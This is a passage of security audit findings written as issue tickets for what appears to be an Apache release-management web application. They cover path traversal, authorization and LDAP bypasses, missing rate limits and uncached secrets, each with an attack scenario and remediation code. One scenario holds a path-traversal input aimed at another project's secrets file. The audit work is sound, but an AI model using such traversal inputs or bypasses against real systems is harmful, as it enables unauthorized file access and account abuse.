- `atr/storage/writers/policy.py` lines ~238-252 (form endpoint without validation)

The API endpoint correctly validates:
```python
def edit_policy(data):
    # Validation applied
    _validate_min_hours(data.min_hours)  # Enforces 72-144 or 0
    policy.min_hours = data.min_hours
```

The form endpoint bypasses validation:
```python
def __set_min_hours(form):
    # Direct assignment without validation
    policy.min_hours = form.min_hours.data
```

Apache governance typically requires:
- Minimum 72 hours for most votes
- Maximum 144 hours to ensure timely completion
- 0 hours for emergency/special cases (requires explicit approval)

Bypassing this allows:
- Setting 1-hour voting periods (insufficient review time)
- Setting 1000-hour voting periods (delayed release process)
- Circumventing governance requirements

### Recommended Remediation
Add `_validate_min_hours()` call in `__set_min_hours()`:

```python
def __set_min_hours(form):
    """Set minimum hours with validation."""
    min_hours = form.min_hours.data
    
    # Apply validation BEFORE assignment
    _validate_min_hours(min_hours)
    
    policy.min_hours = min_hours

# Ensure _validate_min_hours() enforces correct range
def _validate_min_hours(hours: int):
    """Validate minimum hours in allowed range."""
    if hours == 0:
        return  # Explicit zero allowed for emergency votes
    
    if hours < 72 or hours > 144:
        raise ValueError(
            "Minimum vote duration must be between 72 and 144 hours (or 0 for emergency)"
        )
```

### Acceptance Criteria
- [ ] _validate_min_hours() called before assignment
- [ ] Invalid values (1-71 hours) rejected
- [ ] Invalid values (145+ hours) rejected
- [ ] Zero hours allowed (emergency case)
- [ ] Valid range (72-144) accepted
- [ ] Integration tests verify validation
- [ ] Unit test verifying the fix

### References
- Source reports: L1:2.2.1.md
- Related findings: ASVS-221-HIGH-002, ASVS-221-MED-003
- ASVS sections: 2.2.1
- CWE: None specified

### Priority
High

---

## Issue: FINDING-030 - SBOM Task Functions Use File Paths in Path Construction Without Containment Validation

**Labels:** bug, security, priority:high, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Four SBOM task functions (generate_sbom, score_tool, score_attestation, score_osv) use `args.file_path` directly in file system path construction without validating that the path is contained within the expected project/revision directory. While the initial form submission validates the path using `safe.RelPath`, the task function re-uses the string value without re-validating containment, creating a TOCTOU-style vulnerability. Attackers who can modify database or task queue can inject path traversal to read/write files in other projects' directories.

### Details
**Affected Files:**
- `atr/tasks/sbom.py` lines 50-120 (generate_sbom)
- `atr/tasks/sbom.py` lines 140-180 (score_tool)
- `atr/tasks/sbom.py` lines 200-240 (score_attestation)
- `atr/tasks/sbom.py` lines 260-300 (score_osv)

Vulnerable pattern in all four functions:
```python
def sbom_task(args: SBOMTaskArgs):
    # args.file_path is a string, not validated for containment
    full_path = base_dir / args.file_path  # Unsafe path construction
    
    # Operate on file without verifying it's within project directory
    with open(full_path) as f:
        process(f.read())
```

While form submission uses `safe.RelPath`:
```python
# In form handler
form.file_path = safe.RelPath(user_input)  # Validated at submission time
```

The task receives only the string value:
```python
# In task function
args.file_path  # Just a string, no validation
```

Attack scenario:
1. Attacker with database access modifies task args
2. Changes file_path to "../../other-project/secrets.txt"
3. Task executes with traversed path
4. Attacker reads/writes files in other projects

### Recommended Remediation
Re-validate `file_path` as `safe.RelPath` in task functions and add explicit containment check:

```python
from pathlib import Path
from atr import safe

def generate_sbom(args: SBOMGenerateArgs):
    """Generate SBOM with path containment validation."""
    # Re-validate as RelPath
    try:
        rel_path = safe.RelPath(args.file_path)
    except ValueError:
        raise TaskError(f"Invalid file path: {args.file_path}")
    
    # Construct full path
    revision_dir = Path(config.DATA_DIR) / args.project_key / args.version_key
    full_path = (revision_dir / rel_path).resolve()
    
    # Verify resolved path is within revision directory
    if not full_path.is_relative_to(revision_dir.resolve()):
        raise TaskError(f"Path traversal detected: {args.file_path}")
    
    # Now safe to operate on file
    with open(full_path) as f:
        process(f.read())
```

Update `SBOMGenerateArgs` Pydantic model:
```python
class SBOMGenerateArgs(BaseModel):
    file_path: safe.RelPath  # Use RelPath type, not str
    project_key: str
    version_key: str
```

Apply fixes to all 4 affected functions:
- generate_sbom()
- score_tool()
- score_attestation()
- score_osv()

### Acceptance Criteria
- [ ] Path re-validated as safe.RelPath in all task functions
- [ ] Explicit containment check added using is_relative_to()
- [ ] Pydantic model updated to use RelPath type
- [ ] Unit tests verify path traversal rejection
- [ ] Integration tests verify legitimate paths work
- [ ] Unit test verifying the fix

### References
- Source reports: L1:2.2.2.md
- Related findings: MED-007, MED-008
- ASVS sections: 2.2.2
- CWE: CWE-22

### Priority
High

---

## Issue: FINDING-031 - Missing Phase Validation in Vote Start Flow

**Labels:** bug, security, priority:high, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `release_ready_for_vote()` function validates 9 conditions before allowing a vote to start (revision matching, committee existence, blocker checks, file presence, etc.) but does not validate the release phase. This allows committee members to initiate votes on releases in any phase, including RELEASE_CANDIDATE (already voted), RELEASE_PREVIEW (being finalized), and RELEASE (already announced). The function fetches the release without a phase filter, enabling multiple votes to be initiated on the same release and breaking the sequential lifecycle requirement.

### Details
**Affected Files:**
- `atr/db/interaction.py` lines 220-270
- `atr/get/voting.py` (calls release_ready_for_vote)
- `atr/post/voting.py` (calls release_ready_for_vote)
- `atr/get/manual.py` (calls release_ready_for_vote)
- `atr/post/manual.py` (calls release_ready_for_vote)

Current validation checks:
1. Release exists ✓
2. Revision matches ✓
3. Committee exists ✓
4. Blockers resolved ✓
5. Files present ✓
6. Quarantine passed ✓
7. Previous revision archived ✓
8. Signing keys present ✓
9. Vote policy configured ✓
10. **Phase validation ✗ MISSING**

Missing check allows:
- Starting vote on RELEASE_CANDIDATE (already being voted on)
- Starting vote on RELEASE_PREVIEW (vote already completed)
- Starting vote on RELEASE (already announced)
- Multiple simultaneous votes on same release
- Bypassing sequential lifecycle: DRAFT → CANDIDATE → PREVIEW → RELEASE

### Recommended Remediation
Add phase validation to `release_ready_for_vote()`:

```python
def release_ready_for_vote(project_key: str, version_key: str) -> dict:
    """Validate release is ready for vote with phase check."""
    # Existing validation...
    release = session.query(Release).filter_by(
        project_key=project_key,
        version_key=version_key
    ).first()
    
    if not release:
        return {'ready': False, 'reason': 'Release not found'}
    
    # ADD PHASE VALIDATION
    if release.phase != sql.ReleasePhase.RELEASE_CANDIDATE_DRAFT:
        return {
            'ready': False,
            'reason': f'Release is in {release.phase.value} phase. '
                     f'Votes can only be started from RELEASE_CANDIDATE_DRAFT phase.'
        }
    
    # Existing validations (revision, committee, blockers, etc.)
    ...
    
    return {'ready': True}
```

Alternatively, add phase filter to query:
```python
release = session.query(Release).filter_by(
    project_key=project_key,
    version_key=version_key,
    phase=sql.ReleasePhase.RELEASE_CANDIDATE_DRAFT  # Only draft candidates
).first()
```

### Acceptance Criteria
- [ ] Phase validation added to release_ready_for_vote()
- [ ] Only RELEASE_CANDIDATE_DRAFT allowed to start votes
- [ ] Other phases rejected with descriptive error
- [ ] Unit tests verify phase check
- [ ] Integration tests verify vote start prevented for wrong phases
- [ ] Unit test verifying the fix

### References
- Source reports: L1:2.3.1.md
- Related findings: None
- ASVS sections: 2.3.1
- CWE: CWE-841

### Priority
High

---

## Issue: FINDING-032 - Key Committee Association Update Bypasses Storage Layer Authorization

**Labels:** bug, security, priority:high, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `details()` function in `atr/post/keys.py` allows users to update which committees their PGP key is associated with by directly manipulating the database, bypassing the storage layer's `as_committee_participant()` authorization control. While the `add()` function correctly verifies committee membership through the storage layer, `details()` fetches committees directly from the database without membership validation and assigns them to the user's key. This enables users to associate their keys with any committee regardless of actual membership status.

### Details
**Affected Files:**
- `atr/post/keys.py` lines 89-121
- `atr/storage/writers/keys.py` (storage layer with proper authorization)

The `add()` function does it correctly:
```python
def add(session, form):
    # Correct: validates committee membership
    write = storage.write(session)
    write.as_committee_participant(committee_key)  # Authorization check
    write.keys.add_key(...)
```

The `details()` function bypasses authorization:
```python
def details(session, form):
    # Wrong: bypasses authorization
    key = db.query(OpenPGPKey).filter_by(fingerprint=form.fingerprint).first()
    
    # Direct database manipulation without authorization
    selected_committees = form.committees.data
    key.committees = [
        db.query(Committee).filter_by(key=c).first()
        for c in selected_committees
    ]  # No check if user is member of these committees
    
    db.session.commit()
```

Attack scenario:
1. User is member of committee "projectA"
2. User owns PGP key
3. User submits form associating key with "projectB" (not a member)
4. Key associated without validation
5. User's key appears in projectB KEYS file
6. User can sign projectB releases (authorization bypass)

### Recommended Remediation
Replace direct database manipulation with storage layer operations:

```python
def details(session: ClientSession, form: KeyDetailsForm):
    """Update key committee associations with authorization."""
    fingerprint = form.fingerprint
    selected_committees = form.committees.data
    
    # Fetch current key and committees
    key = db.query(OpenPGPKey).filter_by(
        fingerprint=fingerprint,
        asf_uid=session.asf_uid
    ).first()
    
    if not key:
        raise ASFQuartException("Key not found or unauthorized", errorcode=404)
    
    current_committees = {c.key for c in key.committees}
    
    # Use storage layer with authorization
    write = storage.write(session)
    
    # Remove disassociated committees
    for committee_key in current_committees - set(selected_committees):
        # Validate membership before disassociation
        write.as_committee_participant(committee_key).keys.disassociate_fingerprint(
            fingerprint
        )
    
    # Add new committee associations
    for committee_key in set(selected_committees) - current_committees:
        # Validate membership before association (will raise AccessError if not member)
        write.as_committee_participant(committee_key).keys.associate_fingerprint(
            fingerprint
        )
    
    # Regenerate KEYS files for all affected committees
    for committee_key in selected_committees:
        write.as_committee_participant(committee_key).keys.regenerate_keys_file()
    
    return redirect('/keys')
```

### Acceptance Criteria
- [ ] Direct database manipulation replaced with storage layer operations
- [ ] Committee membership validated for each association
- [ ] as_committee_participant() called before changes
- [ ] AccessError properly handled and displayed
- [ ] KEYS files regenerated for affected committees
- [ ] Integration test attempting unauthorized association
- [ ] Unit test verifying the fix

### References
- Source reports: L1:2.3.1.md
- Related findings: None
- ASVS sections: 2.3.1
- CWE: CWE-285

### Priority
High

---

## Issue: FINDING-033 - Release Vote Logic Validation Always Passes Due to Catch-All Pattern

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The release vote logic validator is designed to ensure that `vote_resolved` cannot be set without `vote_started` being set first. However, a catch-all pattern match `(_, _)` appears before the intended validation case, causing the function to always return `True` regardless of the actual state. This undermines the documented business rule that 'cannot have vote_resolved without vote_started' and compromises data integrity.

### Details
**Affected Files:**
- `atr/validate.py` lines 245-260

The broken validation logic:
```python
def validate_vote_dates(vote_started, vote_resolved):
    """Validate vote_resolved cannot exist without vote_started."""
    match (vote_started, vote_resolved):
        case (datetime, datetime):
            return True  # Both set - valid
        
        case (_, _):  # CATCH-ALL MATCHES EVERYTHING
            return True  # Always returns True
        
        case (None, _):  # NEVER REACHED
            # This should catch (None, datetime) - invalid state
            # But catch-all above matches first
            return False
```

This allows invalid database states:
- `vote_started=None, vote_resolved=datetime` (should be rejected)
- Release marked as resolved without ever starting vote
- Business logic violations persisted to database
- Data integrity compromised

The intended validation is documented but never executes due to pattern match order.

### Recommended Remediation
Reorder pattern match cases to place specific cases before catch-all:

```python
def validate_vote_dates(vote_started: datetime | None, vote_resolved: datetime | None) -> bool:
    """Validate vote_resolved cannot exist without vote_started."""
    match (vote_started, vote_resolved):
        case (None, None):
            # Neither set - valid (draft state)
            return True
        
        case (datetime(), None):
            # Started but not resolved - valid (voting in progress)
            return True
        
        case (datetime(), datetime()):
            # Both set - valid (vote completed)
            return True
        
        case (None, datetime()):
            # Resolved without starting - INVALID
            logger.error(
                f"Invalid vote state: vote_resolved set without vote_started"
            )
            return False
        
        case _:
            # Unexpected state
            logger.warning(f"Unexpected vote state: {vote_started}, {vote_resolved}")
            return False
```

Add unit tests covering all four state combinations:
```python
def test_vote_date_validation():
    # Valid states
    assert validate_vote_dates(None, None) == True
    assert validate_vote_dates(datetime.now(), None) == True
    assert validate_vote_dates(datetime.now(), datetime.now()) == True
    
    # Invalid state
    assert validate_vote_dates(None, datetime.now()) == False
```

Run `validate.everything()` against production data to identify existing inconsistencies.

Consider adding SQL CHECK constraint as defense-in-depth:
```sql
ALTER TABLE releases ADD CONSTRAINT vote_dates_consistent 
CHECK (vote_started IS NOT NULL OR vote_resolved IS NULL);
```

### Acceptance Criteria
- [ ] Pattern match cases reordered correctly
- [ ] Specific cases placed before catch-all
- [ ] Unit tests for all four state combinations added
- [ ] Integration test verifies validation executes
- [ ] SQL CHECK constraint considered
- [ ] Production data validated for inconsistencies
- [ ] Unit test verifying the fix

### References
- Source reports: L2:2.1.2.md
- Related findings: None
- ASVS sections: 2.1.2
- CWE: CWE-670

### Priority
High

---

## Issue: FINDING-034 - Vote Duration Not Validated Against Policy Minimum at Vote Start

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
When starting a vote, the user-supplied vote_duration is not validated against the project's configured min_hours policy. The validation function `_validate_min_hours()` exists in the policy module but is only called when editing policies, not when starting votes. This allows committee members to circumvent configured minimum voting periods by providing shorter durations at vote start time, bypassing Apache governance requirements.

### Details
**Affected Files:**
- `atr/storage/writers/vote.py` lines 80-130
- `atr/post/voting.py` lines 77-132

The policy defines minimum vote duration:
```python
# In policy model
class ReleasePolicy:
    min_hours: int  # e.g., 72 hours minimum
```

The `_validate_min_hours()` function exists:
```python
def _validate_min_hours(hours: int):
    """Validate min_hours in allowed range."""
    if hours == 0:
        return  # Emergency votes allowed
    if hours < 72 or hours > 144:
        raise ValueError("Invalid min_hours")
```

But vote start doesn't call it:
```python
def start_vote(vote_duration_choice: int):
    # Missing validation
    # vote_duration_choice could be less than policy.min_hours
    task = create_vote_task(duration=vote_duration_choice)
```

Attack scenario:
1. Project policy requires 72-hour minimum
2. Committee member starts vote with 1-hour duration
3. No validation occurs
4. Vote starts with insufficient review time
5. Governance requirements bypassed

### Recommended Remediation
Add validation in `vote.start()` to check that `vote_duration_choice >= policy.min_hours`:

```python
def start(self, project_key: str, version_key: str, vote_duration_choice: int):
    """Start vote with policy validation."""
    # Fetch release with policy information
    release = self._session.query(Release).filter_by(
        project_key=project_key,
        version_key=version_key
    ).first()
    
    if not release:
        raise storage.AccessError("Release not found")
    
    # Fetch project policy
    policy = release.project.policy
    
    # Validate vote duration against policy minimum
    if policy.min_hours > 0 and vote_duration_choice < policy.min_hours:
        raise storage.AccessError(
            f"Vote duration ({vote_duration_choice}h) is less than "
            f"project minimum ({policy.min_hours}h)"
        )
    
    # Proceed with vote start
    self.promote_to_candidate(release)
    self._create_vote_task(release, vote_duration_choice)
```

Also validate in the form/API handlers before calling storage layer.

### Acceptance Criteria
- [ ] Validation added to vote.start() method
- [ ] Vote duration compared against policy.min_hours
- [ ] AccessError raised if duration too short
- [ ] Descriptive error message provided
- [ ] Unit tests verify validation
- [ ] Integration tests verify governance enforcement
- [ ] Unit test verifying the fix

### References
- Source reports: L2:2.3.2.md
- Related findings: ASVS-232-CRI-002 (FINDING-005)
- ASVS sections: 2.3.2
- CWE: None specified

### Priority
High

---

## Issue: FINDING-035 - State-Changing API Endpoints Lack Per-Endpoint Rate Limits

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Critical state-changing API endpoints (release_create, release_upload, release_announce, vote_start, vote_resolve, distribution_record, policy_update, release_delete) rely only on the global rate limit (500 requests/hour) without per-endpoint throttling. This allows authenticated users to perform resource-intensive operations at rates that can cause service degradation, email flooding, and storage exhaustion.

### Details
**Affected Files:**
- `atr/api/__init__.py` (multiple endpoints)

Affected endpoints without per-endpoint limits:
1. `release_create` - Creates release objects (database writes)
2. `release_upload` - Uploads artifacts (storage writes)
3. `release_announce` - Sends announcement emails
4. `vote_start` - Sends vote initiation emails
5. `vote_resolve` - Processes vote results
6. `distribution_record` - Records downloads
7. `policy_update` - Modifies project policies
8. `release_delete` - Deletes releases (sends notification emails)

Attack scenarios:
- Email flooding: 500 vote_start requests = 500 emails to PMC
- Storage exhaustion: 500 release_upload requests = massive storage usage
- Database load: 500 release_create requests = database overload

The global 500/hour limit is too permissive for these operations.

### Recommended Remediation
Apply tiered rate limiting decorators to state-changing endpoints:

```python
from atr.rate_limiter import rate_limit
from datetime import timedelta

# Tier 1: Email-sending operations (strictest)
@app.post('/api/vote/start')
@rate_limit(5, timedelta(hours=1))  # 5 per hour
async def vote_start(data: VoteStartRequest):
    """Start vote with email rate limiting."""
    ...

@app.post('/api/release/announce')
@rate_limit(5, timedelta(hours=1))  # 5 per hour
async def release_announce(data: ReleaseAnnounceRequest):
    """Announce release with email rate limiting."""
    ...

@app.delete('/api/release/{project_key}/{version_key}')
@rate_limit(5, timedelta(hours=1))  # 5 per hour
async def release_delete(project_key: str, version_key: str):
    """Delete release with email rate limiting."""
    ...

# Tier 2: State-changing operations
@app.post('/api/release/create')
@rate_limit(10, timedelta(hours=1))  # 10 per hour
async def release_create(data: ReleaseCreateRequest):
    """Create release with rate limiting."""
    ...

@app.post('/api/release/upload')
@rate_limit(10, timedelta(hours=1))  # 10 per hour
async def release_upload(data: ReleaseUploadRequest):
    """Upload artifacts with rate limiting."""
    ...

@app.post('/api/vote/resolve')
@rate_limit(10, timedelta(hours=1))  # 10 per hour
async def vote_resolve(data: VoteResolveRequest):
    """Resolve vote with rate limiting."""
    ...

@app.post('/api/distribution/record')
@rate_limit(10, timedelta(hours=1))  # 10 per hour
async def distribution_record(data: DistributionRecordRequest):
    """Record distribution with rate limiting."""
    ...

@app.put('/api/policy/{project_key}')
@rate_limit(10, timedelta(hours=1))  # 10 per hour
async def policy_update(project_key: str, data: PolicyUpdateRequest):
    """Update policy with rate limiting."""
    ...
```

Ensure the `@rate_limit` decorator:
- Uses per-user + per-endpoint tracking
- Returns 429 status code when exceeded
- Includes Retry-After header
- Logs rate limit violations

### Acceptance Criteria
- [ ] Rate limiting decorators added to all 8 endpoints
- [ ] Tier 1 (email): 5/hour limit
- [ ] Tier 2 (state): 10/hour limit
- [ ] Per-user + per-endpoint tracking
- [ ] 429 status returned when exceeded
- [ ] Retry-After header included
- [ ] Rate limit violations logged
- [ ] Unit tests verify rate limiting

### References
- Source reports: L2:2.3.2.md
- Related findings: ASVS-232-HIGH-003
- ASVS sections: 2.3.2
- CWE: None specified

### Priority
High

---

## Issue: FINDING-036 - SSH Interface Lacks Rate Limiting for Write Operations

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The SSH rsync interface has no rate limiting on write operations, while the web interface has comprehensive rate limiting. This creates a bypass path where authenticated users can perform unlimited writes via SSH while being throttled on the web interface, enabling release object creation flooding, parallel upload flooding, and resource exhaustion.

### Details
**Affected Files:**
- `atr/ssh.py` (entire file, no rate limiting)

The web interface has rate limiting:
```python
@app.post('/release/create')
@rate_limit(10, timedelta(hours=1))
def create_release():
    ...
```

The SSH interface has none:
```python
async def _step_02_handle_safely(username, command):
    """Handle rsync write - NO RATE LIMITING."""
    if command.startswith('rsync --server'):
        # Unlimited writes allowed
        await execute_rsync(command)
```

Attack scenarios:
1. **Release flooding**: Create 1000 release objects via repeated SSH writes
2. **Upload flooding**: Upload hundreds of multi-GB archives simultaneously
3. **Resource exhaustion**: Saturate disk I/O and storage
4. **Web rate limit bypass**: Use SSH after hitting web limits

An authenticated user hitting web rate limits can switch to SSH and continue at unlimited rate.

### Recommended Remediation
Implement SSH-specific rate limiting:

```python
import collections
import time
from datetime import datetime, timedelta

class SSHRateLimiter:
    """Rate limiter for SSH operations."""
    
    def __init__(self):
        # Track operations per user: {asf_uid: deque([(timestamp, operation)])}
        self._operations = {}
        self._write_limit_per_minute = 10
        self._write_limit_per_hour = 100
    
    def check_rate_limit(self, asf_uid: str, operation: str):
        """Check if user has exceeded rate limits."""
        now = datetime.utcnow()
        
        if asf_uid not in self._operations:
            self._operations[asf_uid] = collections.deque()
        
        ops = self._operations[asf_uid]
        
        # Remove operations older than 1 hour
        while ops and (now - ops[0][0]) > timedelta(hours=1):
            ops.popleft()
        
        # Count recent operations
        minute_ops = sum(1 for ts, _ in ops if (now - ts) <= timedelta(minutes=1))
        hour_ops = len(ops)
        
        # Check limits
        if minute_ops >= self._write_limit_per_minute:
            raise Exception(
                f"Rate limit exceeded: {self._write_limit_per_minute} writes per minute"
            )
        
        if hour_ops >= self._write_limit_per_hour:
            raise Exception(
                f"Rate limit exceeded: {self._write_limit_per_hour} writes per hour"
            )
        
        # Record operation
        ops.append((now, operation))
    
    def cleanup_old_data(self):
        """Periodic cleanup of old tracking data."""
        now = datetime.utcnow()
        for asf_uid in list(self._operations.keys()):
            ops = self._operations[asf_uid]
            while ops and (now - ops[0][0]) > timedelta(hours=1):
                ops.popleft()
            if not ops:
                del self._operations[asf_uid]

# Global instance
_ssh_rate_limiter = SSHRateLimiter()

# In SSHServer class
async def _step_02_handle_safely(self, username: str, command: str):
    """Handle SSH operation with rate limiting."""
    # Check rate limit for write operations
    if command.startswith('rsync --server') and '--sender' not in command:
        # This is a write operation
        try:
            _ssh_rate_limiter.check_rate_limit(username, 'rsync_write')
        except Exception as e:
            logger.warning(f"SSH rate limit exceeded for {username}: {e}")
            raise
    
    # Existing operation handling...
    await self._execute_command(username, command)

# Add periodic cleanup task
async def cleanup_ssh_rate_limits():
    """Periodic cleanup of SSH rate limit data."""
    while True:
        await asyncio.sleep(3600)  # Every hour
        _ssh_rate_limiter.cleanup_old_data()
```

### Acceptance Criteria
- [ ] SSH rate limiting implemented
- [ ] 10 writes/minute limit enforced
- [ ] 100 writes/hour limit enforced
- [ ] Per-user tracking implemented
- [ ] Periodic cleanup task added
- [ ] Exceeded limits logged
- [ ] Integration tests verify rate limiting
- [ ] Unit test verifying the fix

### References
- Source reports: L2:2.3.2.md
- Related findings: ASVS-232-HIGH-002
- ASVS sections: 2.3.2
- CWE: None specified

### Priority
High

---

(Continuing with remaining findings in next message due to length...)

---

## Issue: FINDING-076 - Runtime Environment Detection Bypasses LDAP Authentication

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The is_dev_environment() function makes runtime determinations based on environment variables or hostname patterns that bypass LDAP authentication independently of the Mode system. This creates a scenario where production mode can be active but LDAP authentication is still bypassed, affecting all users (not just 'test' user) when is_dev_environment() returns True and LDAP is not configured.

### Details
In atr/worker.py lines 217-220, the is_dev_environment() function allows bypassing LDAP authentication based on runtime environment checks that are not gated by the Mode system. This is broader than ASVS-1342-HIGH-001 because it affects all users when the development environment is detected, even when the application is running in Production mode.

The bypass logic creates a scenario where:
- Production mode is active (mode == config.Mode.Production)
- is_dev_environment() returns True (based on env vars or hostname)
- LDAP authentication is bypassed for all users

### Recommended Remediation
Never bypass LDAP in Production mode. Modify the authentication logic to explicitly check the mode:

```python
if mode == config.Mode.Production:
    # Always require LDAP authentication in Production
    # Never allow dev bypass regardless of is_dev_environment()
    if not ldap_configured:
        raise ConfigurationError("LDAP must be configured in Production mode")
    # Proceed with LDAP authentication
else:
    # Only allow dev bypass in Debug mode
    if mode == config.Mode.Debug and not ldap_configured:
        # Allow bypass for development
        pass
```

### Acceptance Criteria
- [ ] LDAP bypass is only allowed when mode == config.Mode.Debug
- [ ] Production mode always requires LDAP authentication
- [ ] is_dev_environment() checks cannot bypass LDAP in Production mode
- [ ] Unit tests verify LDAP is enforced in Production mode regardless of environment detection
- [ ] Integration tests verify authentication behavior across all mode/environment combinations

### References
- Source reports: L2:13.4.2.md
- Related findings: ASVS-1342-HIGH-001
- ASVS sections: 13.4.2

### Priority
High

---

## Issue: FINDING-077 - Admin Endpoints Exposing Secrets Lack Cache-Control Headers

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Admin endpoints expose highly sensitive data including environment variables (containing LDAP passwords, API tokens, database credentials) and SSH key material without HTTP cache-control headers. The application runs behind a reverse proxy (evidenced by hypercorn.middleware.proxy_fix), creating risk of intermediary caching by load balancers, reverse proxies, or CDNs.

### Details
The following admin endpoints in atr/admin/__init__.py expose sensitive data without Cache-Control headers:
- env() function - exposes all environment variables including DATABASE_URL, SECRET_KEY, LDAP_BIND_PASSWORD
- configuration() function - exposes application configuration
- data_model() function - exposes database schema
- _data_browse() function - exposes database records including SSH keys

The add_security_headers() function in atr/server.py sets CSP and other headers but does not set Cache-Control headers, allowing intermediary proxies to cache sensitive responses.

### Recommended Remediation
Add global Cache-Control headers in the atr/server.py after_request hook:

```python
@app.after_request
async def add_security_headers(response: quart.Response) -> quart.Response:
    response.headers["Content-Security-Policy"] = csp_header
    response.headers["Permissions-Policy"] = permissions_policy
    response.headers["X-Permitted-Cross-Domain-Policies"] = "none"
    
    # NEW: Prevent caching of authenticated/sensitive responses
    if "Cache-Control" not in response.headers:
        response.headers["Cache-Control"] = "no-store"
        response.headers["Pragma"] = "no-cache"  # HTTP/1.0 compatibility
    
    return response
```

### Acceptance Criteria
- [ ] All admin endpoints return Cache-Control: no-store header
- [ ] Pragma: no-cache header is set for HTTP/1.0 compatibility
- [ ] Existing Cache-Control headers are not overwritten
- [ ] Unit tests verify headers are present on admin responses
- [ ] Integration tests verify no caching occurs with proxy configuration

### References
- Source reports: L2:14.2.2.md
- Related findings: ASVS-1422-HIGH-002, ASVS-1422-MEDIUM-003
- ASVS sections: 14.2.2

### Priority
High

---

## Issue: FINDING-078 - API JWT Creation Endpoint Missing Cache-Control Header

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The API endpoint for JWT creation (/api/jwt/create) returns credentials without cache-control headers, while the equivalent web endpoint correctly implements Cache-Control: no-store. This inconsistency creates a caching vulnerability where JWT credentials valid for 30 minutes could be cached by server-side components such as CDNs or misconfigured reverse proxies, potentially allowing subsequent requests matching the cache key to receive another user's JWT.

### Details
In atr/api/__init__.py lines 398-415, the jwt_create() function returns JWT tokens without setting Cache-Control headers. If a shared cache (e.g., CDN with aggressive caching, misconfigured Varnish) stores the response, subsequent requests matching the cache key could receive another user's JWT, leading to credential theft.

The web-based JWT endpoint correctly sets Cache-Control: no-store, but the API endpoint has this protection missing, creating an inconsistent security posture.

### Recommended Remediation
Modify the jwt_create() function to return a Quart response with Cache-Control headers:

```python
@api.typed
@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))
async def jwt_create(
    _jwt_create: Literal["jwt/create"],
    data: models.api.JwtCreateArgs,
) -> tuple[quart.Response, int]:
    asf_uid = data.asfuid
    log.set_asf_uid(asf_uid)
    async with storage.write(asf_uid) as write:
        wafc = write.as_foundation_committer()
        jwt = await wafc.tokens.issue_jwt(data.pat)
    
    result = models.api.JwtCreateResults(
        endpoint="/jwt/create",
        asfuid=data.asfuid,
        jwt=jwt,
    ).model_dump(mode="json")
    
    response = quart.jsonify(result)
    response.headers["Cache-Control"] = "no-store"
    response.headers["Pragma"] = "no-cache"
    return response, 200
```

Alternatively, rely on the global fix in FINDING-077 if implemented.

### Acceptance Criteria
- [ ] JWT creation endpoint returns Cache-Control: no-store header
- [ ] Pragma: no-cache header is set
- [ ] Unit tests verify headers are present on JWT responses
- [ ] Integration tests verify JWT responses are not cached
- [ ] Consistency with web endpoint JWT creation is verified

### References
- Source reports: L2:14.2.2.md
- Related findings: ASVS-1422-HIGH-001
- ASVS sections: 14.2.2

### Priority
High

---

## Issue: FINDING-079 - OAuth Login Success Response Lacks Anti-Caching Headers

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The OAuth login success response displays the authenticated user's UID in plain text without anti-caching headers. Both the redirect and non-redirect variants of the response lack protection. User identity cached in browser history becomes visible on shared workstations or through browser history inspection.

### Details
In src/asfquart/generics.py lines 103-119, the OAuth callback success response creates plain text or HTML responses without setting Cache-Control headers. Data flow: OAuth callback → user identity in response body → no Cache-Control → browser cache.

On shared administrative workstations, this represents a privacy risk where user identities can be recovered from browser cache or history after the user has logged out.

### Recommended Remediation
Create the quart.Response object and add response.headers['Cache-Control'] = 'no-store' before setting the optional Refresh header and returning the response:

```python
# After creating the response
response = quart.Response(response_body, mimetype='text/html')
response.headers['Cache-Control'] = 'no-store'
response.headers['Pragma'] = 'no-cache'

# Set optional Refresh header if redirect_uri exists
if redirect_uri:
    response.headers['Refresh'] = f'0; url={redirect_uri}'

return response
```

### Acceptance Criteria
- [ ] OAuth success responses include Cache-Control: no-store header
- [ ] Pragma: no-cache header is set
- [ ] Both redirect and non-redirect variants have anti-caching headers
- [ ] Unit tests verify headers are present on OAuth success responses
- [ ] Browser testing confirms responses are not cached

### References
- Source reports: L2:14.3.2.md
- Related findings: ASVS-1432-CRI-005
- ASVS sections: 14.3.2

### Priority
High

---

## Issue: FINDING-080 - Admin Endpoints Expose Sensitive System Data Without Anti-Caching Headers

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Admin endpoints expose highly sensitive system information including environment variables (with database credentials, API keys, LDAP passwords), application configuration, logs, and database records—all without anti-caching headers. The most critical is the /admin/env endpoint which exposes all environment variables. All affected endpoints use web.TextResponse which does not set any caching headers. On shared administrative workstations, this represents a severe credential exposure risk.

### Details
Affected endpoints in atr/admin/__init__.py:
- Line 338: env() - exposes DATABASE_URL, SECRET_KEY, LDAP_BIND_PASSWORD
- Line 152: configuration() - exposes application config
- Line 468: data_model() - exposes database schema
- Line 168: logs() - exposes application logs
- Line 202: _data_browse() - exposes database records including SSH keys

The web.TextResponse class in atr/web.py does not set Cache-Control headers by default, leaving all these sensitive responses cacheable by browsers and intermediaries.

### Recommended Remediation
Option 1 (Global fix - recommended): Add self.headers['Cache-Control'] = 'no-store' to the TextResponse.__init__ method in atr/web.py.

Option 2 (Per-endpoint): Modify each sensitive endpoint to set Cache-Control headers explicitly.

Also consider adding the same header to ElementResponse and other custom response classes.

```python
class TextResponse:
    def __init__(self, text: str, status: int = 200):
        self.text = text
        self.status = status
        self.headers = {}
